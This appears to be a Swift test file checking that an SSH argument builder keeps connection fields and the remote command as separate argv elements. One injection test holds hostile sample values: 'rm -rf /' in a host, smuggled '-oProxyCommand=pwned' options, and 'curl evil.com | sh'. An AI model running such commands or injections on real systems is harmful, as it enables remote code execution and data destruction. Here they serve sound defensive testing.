// Tests/AinkradTests/SSHArgsBuilderTests.swift
import Foundation
import Testing

@testable import Ainkrad

@Suite("SSHArgsBuilder")
struct SSHArgsBuilderTests {
    @Test func buildsUserHostAndCommand() {
        let conn = SSHConnectionInfo(
            host: "build.local", user: "ci", port: nil,
            identityPath: nil, remoteWorkingDir: nil)
        let args = SSHArgsBuilder.args(conn, command: "echo hi")
        #expect(args.contains("ci@build.local"))
        #expect(args.contains("BatchMode=yes"))
        #expect(args.last == "echo hi")
    }

    @Test func includesIdentityPortAndRemoteWorkingDir() {
        let conn = SSHConnectionInfo(
            host: "h", user: "u", port: 2222,
            identityPath: "/keys/id", remoteWorkingDir: "/srv/app")
        let args = SSHArgsBuilder.args(conn, command: "make")
        #expect(args.contains("-i"))
        #expect(args.contains("/keys/id"))
        #expect(args.contains("-p"))
        #expect(args.contains("2222"))
        #expect(args.last == "cd /srv/app && make")
    }

    // No-injection: the remote command and every connection field are
    // separate argv elements, so a value containing shell/ssh
    // metacharacters can't inject an extra ssh option or escape into the
    // remote command slot — `Process` passes argv verbatim, no shell
    // re-tokenization.
    @Test func adversarialFieldsCannotInjectExtraArgvOrOptions() {
        let conn = SSHConnectionInfo(
            host: "evil; rm -rf /", user: "u -oProxyCommand=pwned",
            port: nil, identityPath: "/keys/id -oProxyCommand=pwned",
            remoteWorkingDir: nil)
        let args = SSHArgsBuilder.args(conn, command: "echo hi && curl evil.com | sh")
        // The identity path is a single argv element right after "-i",
        // never split/parsed for embedded flags.
        let idIndex = args.firstIndex(of: "-i")!
        #expect(args[idIndex + 1] == "/keys/id -oProxyCommand=pwned")
        // user@host is a single argv element, not re-split by ssh option
        // parsing (no bare "-oProxyCommand=pwned" element leaks in).
        #expect(args.contains("u -oProxyCommand=pwned@evil; rm -rf /"))
        #expect(!args.contains("-oProxyCommand=pwned"))
        // The adversarial command is the final, single argv element — it is
        // never split into separate ssh options.
        #expect(args.last == "echo hi && curl evil.com | sh")
        #expect(args.count == args.map { $0 }.count)  // no hidden expansion
    }

    @Test func deterministicForSameInput() {
        let conn = SSHConnectionInfo(
            host: "h", user: "u", port: 22,
            identityPath: "/k", remoteWorkingDir: "/w")
        let a1 = SSHArgsBuilder.args(conn, command: "make")
        let a2 = SSHArgsBuilder.args(conn, command: "make")
        #expect(a1 == a2)
    }
}
